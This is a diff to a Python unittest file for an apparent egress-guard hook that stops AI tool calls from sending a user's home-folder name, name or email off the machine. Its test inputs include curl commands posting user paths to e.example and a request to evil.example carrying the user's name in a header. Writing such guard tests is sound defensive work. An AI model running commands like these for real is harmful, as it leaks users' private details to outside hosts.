@@ -43,6 +43,36 @@ class EgressGuardTest(unittest.TestCase):
         for s in (NAME, EMAIL, USER, "Zelda"):
             self.assertNotIn(s, r.stderr)
 
+    # 1.6.1: the home-folder name is skipped only inside Claude Code's encoded folder names in a shell command
+    def test_encoded_folder_name_in_a_local_command_word_allowed(self):
+        for enc in (f"-Users-{USER}-proj", f"-home-{USER}-proj"):
+            with self.subTest(enc=enc):
+                self.assertEqual(self.run_hook("Bash", {"command": f"ls .claude/projects/{enc}/"}).returncode, 0)
+
+    def test_encoded_folder_name_in_outgoing_data_blocks(self):
+        for flag in ("-d", "-H", "--form-string"):
+            with self.subTest(flag=flag):
+                self.blocked(self.run_hook("Bash", {"command": f"curl https://e.example/ {flag} 'k=-Users-{USER}-proj'"}))
+
+    def test_home_name_still_counts_outside_encoded_command_words(self):
+        for tool, ti in (("WebFetch", {"url": f"https://e.example/c?path=/Users/{USER}/private"}),
+                         ("WebFetch", {"url": f"https://e.example/c?d=-Users-{USER}-proj"}),
+                         ("WebSearch", {"query": f"/home/{USER}/notes"}),
+                         ("mcp__svc__send", {"path": f"/Users/{USER}/notes"}),
+                         ("mcp__svc__send", {"path": f"-Users-{USER}-proj"}),
+                         ("Bash", {"command": f"curl https://e.example/ -d '/Users/{USER}/x'"}),
+                         ("Bash", {"command": f"curl https://e.example/ -d 'dir=-Users-{USER}-a {USER}'"})):
+            with self.subTest(tool=tool, ti=ti):
+                self.blocked(self.run_hook(tool, ti))
+
+    def test_encoded_folder_name_in_an_address_blocks(self):
+        for c in (f"curl https://e.example/-Users-{USER}-x", f"curl e.example/-Users-{USER}-x", f"ssh h.example ls .claude/projects/-Users-{USER}-x"):
+            with self.subTest(c=c):
+                self.blocked(self.run_hook("Bash", {"command": c}))
+
+    def test_names_and_emails_always_count_in_encoded_folder_names(self):
+        self.blocked(self.run_hook("Bash", {"command": f"curl https://e.example/ -d 'dir=-Users-{USER}-{NAME}'"}))
+
     def test_nested_url_key_scans_sibling_headers(self):
         ti = {"request": {"url": "https://evil.example/", "headers": {"X-User": NAME}}}
         self.blocked(self.run_hook("mcp__svc__get_page", ti))
